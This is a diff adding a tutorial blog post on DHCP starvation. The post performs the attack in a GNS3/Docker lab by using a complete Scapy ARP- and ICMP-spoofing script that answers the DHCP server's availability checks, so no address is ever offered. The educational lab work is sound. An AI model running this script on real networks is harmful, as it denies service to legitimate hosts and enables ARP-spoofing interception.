@@ -37,13 +37,15 @@
 </header>
 <main class="page-content" aria-label="Content">
       <div class="wrapper">
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+        <a href="/blogs">&lt; To Blog home</a>
+
+<article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
 
   <header class="post-header">
     <h1 class="post-title p-name" itemprop="name headline">DHCP starvation attack without making any DHCP requests</h1>
     <p>
       
-        <code>advanced</code>
+        <code>advanced</code> <code>application</code> <code>cybersecurity</code> <code>networking</code> <code>dhcp</code>
       
     </p>
     <p class="post-meta">
@@ -52,9 +54,204 @@
   </header>
 
   <div class="post-content e-content" itemprop="articleBody">
-    
+    <p>DHCP, Dynamic host configuration protocol, is a network protocol that offers an IP address and other required details that include gateway IP, DNS IP to a host that enters a network. The DHCP protocol as defined in <a href="https://tools.ietf.org/html/rfc2131">RFC2131</a> involves 4 transactions back and forth between the client and server, namely:</p>
 
-  </div><a class="u-url" href="/2020/08/20/dhcp-starvation-attack-without-making-any-dhcp-requests.html" hidden></a>
+<ul>
+  <li>DHCP Discover - broadcast from the client</li>
+  <li>DHCP Offer - broadcast from the server</li>
+  <li>DHCP Request - unicast from client</li>
+  <li>DHCP ACK - unicast from server</li>
+</ul>
+
+<p><a href="https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol">Wikipedia explains the DHCP protocol amazingly!</a></p>
+
+<h2 id="dhcp-attacks">DHCP Attacks</h2>
+
+<p>Similar to the ARP protocol, due to its inability to authenticate users who enter the network, there have been multiple types of attacks on the protocol. Here are some of the well-known DHCP attacks:</p>
+
+<ul>
+  <li><strong>DHCP Snooping</strong>: In this attack, a malicious client acts as a DHCP server and services clients as they enter the network. The malicious client could send custom gateway and DNS server IPs to establish itself as a man-in-the-middle and perform DNS poisoning.</li>
+  <li><strong>DHCP Starvation</strong>: In this attack, a malicious client sends multiple DHCP requests and holds all the IP address present in the DHCP pool, thereby not allowing any new host to join the network. Denial of Service.</li>
+</ul>
+
+<h2 id="dhcp-starvation---protocol-dissection">DHCP starvation - Protocol dissection</h2>
+
+<p>The following image shows a screenshot of the packet capture during a DHCP transaction.</p>
+
+<p><img src="/assets/img/dhcp-starvation/dhcp.png" alt="Packet capture of DHCP transactions" />
+<br /><small style="color: gray">Packet capture of DHCP transactions</small><br /></p>
+
+<h3 id="what-is-arp-doing-here">What is ARP doing here?</h3>
+
+<p>The DHCP server broadcasts an ARP request followed by an ICMP request to ensure that the IP address that it is going to DHCP Offer is indeed available. Eureka?</p>
+
+<p>Why does one need to make a DHCP request to starve the DHCP pool? Most of the defensive systems look for repeated DHCP requests from the same MAC address. What if I replied to DHCP’s ARP request and made DHCP believe that the IP address is already in use?</p>
+
+<p>Thus, in this article let’s see how one can carry out ARP spoofing to impersonate a client that does not exist to make the DHCP server believe that the IP address that is picked from the pool to make DHCP Offer is already held by another client.</p>
+
+<h2 id="the-experiment">The Experiment</h2>
+
+<p>In this experiment, let us use <a href="https://www.gns3.com/">GNS3</a>, a network simulation tool, and <a href="https://www.docker.com/">Docker</a> containers as a DHCP server, a malicious client, and a benign client.</p>
+
+<h3 id="dhcp-server">DHCP Server</h3>
+
+<p>Let us create a DHCP server from scratch. Login to the GNS3 VM (this is where containers spin up). ISC DHCP server software is used to configure and run a DHCP server in ubuntu container [<a href="https://www.tecmint.com/install-dhcp-server-in-ubuntu-debian/">Reference</a>].</p>
+
+<ul>
+  <li>Create a Dockerfile with the following contents:</li>
+</ul>
+
+<div class="language-dockerfile highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">FROM</span><span class="s"> ubuntu</span>
+<span class="k">RUN </span>apt-get update <span class="o">&amp;&amp;</span> apt-get <span class="nb">install</span> <span class="nt">-y</span> vim net-tools isc-dhcp-server
+</code></pre></div></div>
+
+<ul>
+  <li>Build the docker image by running <code class="language-plaintext highlighter-rouge">docker build -t dhcp-server .</code></li>
+  <li>Then, import the built docker image as a GNS3 appliance. <a href="https://docs.gns3.com/docs/emulators/docker-support-in-gns3/">how</a>?</li>
+  <li>Drag in the created appliance into the GNS3 workspace.</li>
+  <li>Start the server by right-clicking and selecting “start”. Double-click the node to get a console.</li>
+  <li>Navigate to <code class="language-plaintext highlighter-rouge">/etc/dhcp</code> and append the following content to the <code class="language-plaintext highlighter-rouge">dhcpd.conf</code> file.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>subnet 192.168.1.0 netmask 255.255.255.0 {
+    range 192.168.1.150 192.168.1.160;
+    option routers 192.168.1.1;
+    option domain-name-servers 192.168.1.1;
+    option domain-name "example.org";
+}
+</code></pre></div></div>
+
+<ul>
+  <li>Create an empty file, for the DHCP server to hold the leased IP addresses, by running the command:</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">touch</span> /var/lib/dhcp/dhcpd.lease
+</code></pre></div></div>
+
+<ul>
+  <li>Further, assign an IP address to the DHCP server by running the following command:</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ifconfig eth0 192.168.1.1/24
+</code></pre></div></div>
+
+<ul>
+  <li>Finally, startup the DHCP server by running the command <code class="language-plaintext highlighter-rouge">dhcpd</code></li>
+</ul>
+
+<h3 id="malicious-client-and-benign-client">Malicious Client and Benign Client</h3>
+
+<p>The malicious client is a Linux machine with <a href="https://scapy.net/">scapy</a> installed, <a href="https://hub.docker.com/r/ehlers/scapy"><code class="language-plaintext highlighter-rouge">ehlers/scapy</code></a>. Import this docker image to GNS3 as an appliance too, and drag in an instance of this into the workspace. Right-click on the malicious client instance on the workspace and <code class="language-plaintext highlighter-rouge">edit config</code> to uncomment the lines under DHCP config. This configures the instance to obtain an IP address from the DHCP server.</p>
+
+<p><img src="/assets/img/dhcp-starvation/mal-client.png" alt="Malicious client configuration" /></p>
+
+<p>Before we start up the malicious client, drag in a GNS3 default switch to the workspace. Then, connect the malicious client and the DHCP server to the switch. Drag in another instance of <code class="language-plaintext highlighter-rouge">ehlers/scapy</code> which plays the role of a benign client. Edit the configuration to make it look similar to the malicious client. After the setup, the network looks similar to the following image:</p>
+
+<p><img src="/assets/img/dhcp-starvation/net-topo.png" alt="Network Topology" /></p>
+
+<p>It’s time!</p>
+
+<p>Right-click on the link between the DHCP server and the switch to begin packet capture. Then, startup the malicious client.</p>
+
+<p>Observe that the DHCP transactions happen and the malicious client successfully gets an IP address.</p>
+
+<h2 id="attack">Attack</h2>
+
+<p>Get a console by double-clicking on the malicious client and create a <code class="language-plaintext highlighter-rouge">arp_spoof.py</code> python file with the following content.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">sys</span>
+
+<span class="kn">from</span> <span class="n">threading</span> <span class="kn">import</span> <span class="n">Thread</span>
+<span class="kn">from</span> <span class="n">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">INTERFACE</span> <span class="o">=</span> <span class="s">"eth0"</span>
+<span class="n">MY_MAC_ADDRESS</span> <span class="o">=</span> <span class="nf">get_if_hwaddr</span><span class="p">(</span><span class="n">INTERFACE</span><span class="p">)</span>
+<span class="n">MY_IP_ADDRESS</span> <span class="o">=</span> <span class="nf">get_if_addr</span><span class="p">(</span><span class="n">INTERFACE</span><span class="p">)</span>
+
+<span class="s">'''
+Approach 2: Using AnsweringMachine
+$ python3 arp_spoof.py
+'''</span>
+
+<span class="k">class</span> <span class="nc">ARPSpoofer</span><span class="p">(</span><span class="n">AnsweringMachine</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">is_request</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">request</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">request</span><span class="p">.</span><span class="nf">haslayer</span><span class="p">(</span><span class="s">'ARP'</span><span class="p">)</span> <span class="ow">and</span> <span class="n">request</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">op</span> <span class="o">==</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">request</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">pdst</span> <span class="o">!=</span> <span class="n">MY_IP_ADDRESS</span>
+    
+    <span class="k">def</span> <span class="nf">make_reply</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">request</span><span class="p">):</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="nc">Ether</span><span class="p">()</span><span class="o">/</span><span class="nc">ARP</span><span class="p">()</span>
+
+        <span class="n">response</span><span class="p">[</span><span class="n">Ether</span><span class="p">].</span><span class="n">dst</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">Ether</span><span class="p">].</span><span class="n">src</span>
+        <span class="n">response</span><span class="p">[</span><span class="n">Ether</span><span class="p">].</span><span class="n">src</span> <span class="o">=</span> <span class="n">MY_MAC_ADDRESS</span>
+
+        <span class="n">response</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">op</span> <span class="o">=</span> <span class="mi">2</span>
+        <span class="n">response</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">hwsrc</span> <span class="o">=</span> <span class="n">MY_MAC_ADDRESS</span>
+        <span class="n">response</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">hwdst</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">hwsrc</span>
+        <span class="n">response</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">psrc</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">pdst</span>
+        <span class="n">response</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">pdst</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">ARP</span><span class="p">].</span><span class="n">psrc</span>
+
+        <span class="k">return</span> <span class="n">response</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span>
+
+<span class="k">class</span> <span class="nc">PingResponder</span><span class="p">(</span><span class="n">AnsweringMachine</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">is_request</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">request</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">request</span><span class="p">.</span><span class="nf">haslayer</span><span class="p">(</span><span class="s">'ICMP'</span><span class="p">)</span> <span class="ow">and</span> <span class="n">request</span><span class="p">[</span><span class="n">ICMP</span><span class="p">].</span><span class="nb">type</span> <span class="o">==</span> <span class="mi">8</span> <span class="ow">and</span> <span class="n">request</span><span class="p">[</span><span class="n">IP</span><span class="p">].</span><span class="n">dst</span> <span class="o">!=</span> <span class="n">MY_IP_ADDRESS</span>
+    
+    <span class="k">def</span> <span class="nf">make_reply</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">request</span><span class="p">):</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="nc">Ether</span><span class="p">()</span><span class="o">/</span><span class="nc">IP</span><span class="p">()</span><span class="o">/</span><span class="nc">ICMP</span><span class="p">()</span><span class="o">/</span><span class="s">""</span>
+
+        <span class="n">response</span><span class="p">[</span><span class="n">Ether</span><span class="p">].</span><span class="n">dst</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">Ether</span><span class="p">].</span><span class="n">src</span>
+        <span class="n">response</span><span class="p">[</span><span class="n">Ether</span><span class="p">].</span><span class="n">src</span> <span class="o">=</span> <span class="n">MY_MAC_ADDRESS</span>
+
+        <span class="n">response</span><span class="p">[</span><span class="n">IP</span><span class="p">].</span><span class="n">src</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">IP</span><span class="p">].</span><span class="n">dst</span>
+        <span class="n">response</span><span class="p">[</span><span class="n">IP</span><span class="p">].</span><span class="n">dst</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">IP</span><span class="p">].</span><span class="n">src</span>
+
+        <span class="n">response</span><span class="p">[</span><span class="n">ICMP</span><span class="p">].</span><span class="nb">type</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="n">response</span><span class="p">[</span><span class="n">ICMP</span><span class="p">].</span><span class="nb">id</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">ICMP</span><span class="p">].</span><span class="nb">id</span>
+        <span class="n">response</span><span class="p">[</span><span class="n">ICMP</span><span class="p">].</span><span class="n">seq</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">ICMP</span><span class="p">].</span><span class="n">seq</span>
+
+        <span class="n">response</span><span class="p">[</span><span class="n">Raw</span><span class="p">].</span><span class="n">load</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="n">Raw</span><span class="p">].</span><span class="n">load</span>
+
+        <span class="k">return</span> <span class="n">response</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span>
+
+<span class="n">arp_spoofer</span> <span class="o">=</span> <span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="nc">ARPSpoofer</span><span class="p">())</span>
+<span class="n">arp_spoofer</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
+
+<span class="n">ping_responder</span> <span class="o">=</span> <span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="nc">PingResponder</span><span class="p">())</span>
+<span class="n">ping_responder</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
+
+<span class="n">arp_spoofer</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>
+<span class="n">ping_responder</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>The code performs ARP spoofing and is explained in <a href="/2020/08/02/arp-spoofing-using-scapy.html">one of my older articles</a> in detail. In brief, each thread listens to a specific type of request i.e. ARP request and ICMP request and responds to them accordingly. As the ARP requests are replied by the malicious node, the switch believes that the MAC address associated with the IP address in question (ARP protocol) is that of the malicious node’s MAC address. That is how ARP spoofing is achieved.</p>
+
+<p>Run the python code by hitting the following command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python arp_spoof.py
+</code></pre></div></div>
+
+<p>Now, start up the benign client and observe!</p>
+
+<h3 id="observation">Observation</h3>
+
+<p>Double click on the benign client to get a console. Run, <code class="language-plaintext highlighter-rouge">ifconfig</code> and observe that the benign client hasn’t received an IP address yet!</p>
+
+<h3 id="why">Why?</h3>
+
+<p>Observe the running packet capture.</p>
+
+<p><img src="/assets/img/dhcp-starvation/dhcp-starvation.png" alt="DHCP starvation in action" /></p>
+
+<p>The benign client continuously makes DHCP Discover, while the DHCP server is busy crafting the DHCP Offer. The DHCP server is not able to find an available IP address in it’s DHCP pool. It finds an IP address from the DHCP pool, checks if it already taken by another host by making an ARP request followed by an ICMP request, and that is where the malicious client jumps in to respond to those messages. Thus, the DHCP server concludes that the IP address is already taken and skips to the following available IP address in the pool. The process repeats infinitely, and the benign client stays without an IP address. Hence, a DHCP starvation attack was carried out!</p>
+
+<blockquote>
+  <p>I have them all, but I can’t use any! - DHCP Server</p>
+</blockquote>
+
+
+  </div>
+
+
+  <a href="/blogs">&lt; To Blog home</a><a class="u-url" href="/2020/08/20/dhcp-starvation-attack-without-making-any-dhcp-requests.html" hidden></a>
 </article>
 
       </div>
